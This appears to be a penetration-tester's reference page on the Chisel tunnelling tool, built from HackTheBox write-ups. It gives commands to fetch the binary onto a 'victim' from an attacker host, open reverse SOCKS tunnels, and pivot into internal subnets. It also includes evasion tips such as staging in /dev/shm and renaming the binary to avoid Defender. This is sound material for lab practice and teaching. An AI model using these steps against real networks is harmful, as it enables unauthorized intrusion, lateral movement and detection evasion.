---
title: "Chisel"
type: tool
tags: [chisel, network, pivoting, port-forwarding, proxy, socks, tunneling]
date_created: 2026-05-12
date_updated: 2026-05-12
sources: [0xdf-tools-chisel]
phase: pivot
---

# Chisel

## Purpose

Chisel is an HTTP/WebSocket-based TCP tunnel that runs as a single binary on both client and server, enabling port forwarding and SOCKS proxy creation through firewalls that permit HTTP/HTTPS traffic.

## Install / Setup

### Attacker machine (Linux)

```bash
# Download latest release from GitHub
wget https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.gz
gunzip chisel_1.10.0_linux_amd64.gz
chmod +x chisel_1.10.0_linux_amd64

# Or build from source
go install github.com/jpillora/chisel@latest
```

### Transfer to victim (Linux)

```bash
# Serve binary from attacker with Python webserver
python3 -m http.server 80

# On victim — fetch with wget or curl
wget 10.10.14.6/chisel_1.10.0_linux_amd64 -O /tmp/c
chmod +x /tmp/c

curl 10.10.14.6/chisel_1.10.0_linux_amd64 -o /tmp/c
chmod +x /tmp/c
```

### Transfer to victim (Windows)

```powershell
# Download Windows binary from attacker's webserver
curl http://10.10.14.6/chisel_1.10.1_windows_amd64 -outfile C:\ProgramData\c.exe

# Via SMB share
copy \\10.10.14.20\share\chisel_1.6.0_windows_amd64 C:\ProgramData\c.exe
```

Binary naming convention: `chisel_<version>_<os>_<arch>` — for example `chisel_1.10.0_linux_amd64`, `chisel_1.10.1_windows_amd64`.

---

## Core Usage

### Server mode (always runs on attacker)

```bash
# Standard reverse tunnel server — default port 8080
./chisel server --reverse

# Custom port (required if Burp or another tool already uses 8080)
./chisel server -p 8000 --reverse

# With authentication (prevents unauthorized connections)
./chisel server -p 8000 --reverse --auth user:password

# With SOCKS5 support (for bind-mode SOCKS proxy)
./chisel server -p 8000 --socks5
```

Key server flags:

| Flag | Purpose |
|---|---|
| `-p <port>` | Port to listen on (default 8080) |
| `--reverse` | Allow clients to open reverse tunnels (required for `R:` specs) |
| `--socks5` | Enable SOCKS5 for bind-mode clients |
| `--auth user:pass` | Require authentication |

### Client mode (runs on victim)

```bash
# General syntax
./chisel client <server-ip>:<server-port> <tunnel-spec> [<tunnel-spec>...]
```

**Remote spec format:** `R:<local_port>:<target_host>:<target_port>`

- `R:` prefix means the listening port opens on the **server** (attacker), not the client
- Omitting `R:` opens the port on the client (bind mode)
- Special value `socks` creates a SOCKS proxy instead of a single port forward

Key client flags:

| Flag | Purpose |
|---|---|
| `--auth user:pass` | Match server authentication |
| `--proxy <url>` | Route chisel traffic through an HTTP proxy |

---

## Common Use Cases

### SOCKS proxy (most common HTB pattern)

Creates a SOCKS5 proxy on attacker port 1080, routing all traffic through the victim into its network.

**Attacker:**
```bash
./chisel server -p 8000 --reverse
```

**Victim:**
```bash
./chisel client 10.10.14.6:8000 R:socks
```

Server confirms: `proxy#R:127.0.0.1:1080=>socks: Listening`

Configure proxychains (`/etc/proxychains.conf` or `/etc/proxychains4.conf`):
```ini
[ProxyList]
socks5  127.0.0.1 1080
```

Use any tool through the tunnel:
```bash
proxychains nmap -Pn -sT -p 80,443,3389 172.17.0.2
proxychains curl http://172.17.0.2/
proxychains evil-winrm -i 127.0.0.1 -u user -p password
proxychains ssh user@172.17.0.2
```

---

### Single port forward (reverse)

Expose a specific internal service as a port on the attacker machine.

**Attacker:**
```bash
./chisel server -p 8000 --reverse
```

**Victim (Linux, forwarding CUPS on localhost:631 to attacker:9631):**
```bash
./chisel client 10.10.14.6:8000 R:9631:localhost:631
```

**Victim (Windows, forwarding internal service on 127.0.0.1:8888):**
```cmd
.\c.exe client 10.10.14.20:8000 R:8888:localhost:8888
```

Now access `localhost:9631` on the attacker to reach the internal service.

Multiple forwards in one client command:
```bash
./chisel client 10.10.14.6:8000 R:9631:localhost:631 R:5985:172.16.22.1:5985
```

---

### Forward to non-localhost target (pivot into subnet)

Expose a service on a different host in the victim's network.

**Attacker:**
```bash
./chisel server -p 8000 --reverse
```

**Victim (forwarding attacker's 5985 to internal host 172.16.22.1:5985):**
```bash
./chisel client 10.10.14.6:8000 R:5985:172.16.22.1:5985
```

Then from attacker: `evil-winrm -i 127.0.0.1 -u user -p pass`

---

### Windows SOCKS proxy for lateral movement

Upload Windows binary, open socks proxy, then use proxychains for WinRM, SMB, etc.

**Attacker:**
```bash
./chisel server -p 8000 --reverse
```

**Windows victim:**
```cmd
.\c.exe client 10.10.14.6:8000 R:socks
```

**Attacker (using the tunnel):**
```bash
proxychains evil-winrm -i 172.16.x.x -u development -p 'password'
proxychains impacket-smbclient //172.16.x.x/share -U user%pass
```

---

### Forwarding a specific internal port (non-SOCKS)

When SOCKS is overkill and only one port is needed (e.g. a specific web app or DB service):

**Victim (forward internal 172.18.0.5:5000 to attacker's 5000):**
```bash
./chisel client 10.10.14.6:8000 R:5000:172.18.0.5:5000
```

Server confirmation:
```
server: session#1: tun: proxy#R:5000=>172.18.0.5:5000: Listening
```

---

### Bind mode (attacker connects to victim's chisel server)

Used when the attacker can connect outbound to the victim (less common in HTB).

**Victim (runs server):**
```bash
./chisel server -p 8080 --socks5
```

**Attacker (connects to victim's server, creates SOCKS proxy locally):**
```bash
./chisel client <victim-ip>:8080 socks
```

---

## Tips and Gotchas

- **Port 8080 conflict:** Burp Suite listens on 8080 by default. Always use `-p 8000` or another free port for the chisel server to avoid the conflict.

- **Windows `localhost` routes to IPv6:** On Windows, `localhost` resolves to `::1` (IPv6) by default. If the service you want to forward is not listening on IPv6, the tunnel silently fails. Always use `127.0.0.1` explicitly in the remote spec. Example: `R:1234:127.0.0.1:1234` not `R:1234:localhost:1234`.

- **Default SOCKS port is 1080:** When a client connects with `R:socks`, chisel opens the SOCKS listener on attacker port 1080 by default. Configure proxychains accordingly.

- **Version mismatch is non-fatal:** If client and server versions differ slightly (e.g. client 1.10.1, server 1.10.0), chisel logs a warning but still works.

- **Non-root can forward high-numbered ports only:** If the chisel server is not running as root, it cannot bind to ports below 1024 on the attacker. Use ports like 9631, 9512, etc. instead of 631 or 443 for the listening side.

- **Binary size:** Chisel binaries are 7-9 MB. Use `/dev/shm` on Linux victims to avoid writing to disk in forensically sensitive locations. Use `C:\ProgramData` or `C:\Windows\Temp` on Windows.

- **Firewall evasion:** Because chisel traffic runs over HTTP/WebSocket, it bypasses many application firewalls. Using port 443 or 80 for the server further blends with normal traffic.

- **Windows Defender:** Chisel itself is rarely flagged, but the binaries from GitHub releases may be. If transfer fails silently, check Defender logs. Rename the binary (e.g. `c.exe`) to reduce signature matching.

- **FoxyProxy integration:** In addition to proxychains, configure FoxyProxy in Firefox (SOCKS5, 127.0.0.1:1080) to browse internal web apps through the tunnel. This is the standard 0xdf workflow for web apps in container environments.

- **Double pivot:** For a second hop, start a second chisel client on the intermediate host that connects back to the same attacker server but forward to the third-layer network. Use proxychains through the first SOCKS tunnel to reach the second host and run the second client command.

---

## Related Techniques

- [[pivoting-tunneling]] — broader methodology; SSH tunneling, Ligolo-ng, Metasploit pivoting
- [[ad-lateral-movement]] — what you do once you have network access through the tunnel

---

## Sources

- 0xdf HTB writeups: antique, anubis, breadcrumbs, buff, build, carpediem, cerberus, cybermonday, darkzero, derailed, feline, hancliffe
- Chisel GitHub: https://github.com/jpillora/chisel
